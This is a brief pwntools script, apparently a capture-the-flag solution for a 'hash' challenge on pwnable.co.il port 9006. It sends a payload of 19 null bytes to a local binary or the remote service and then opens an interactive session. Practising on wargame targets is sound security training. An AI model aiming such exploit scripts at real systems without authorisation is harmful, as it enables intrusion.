from pwn import * 

context.log_level = 'DEBUG'
if args['LOCAL']:
    io = process('./hash')
else:
    io = remote('pwnable.co.il', 9006)
    
payload = b'\x00' * 19
io.sendline(payload)
io.interactive()
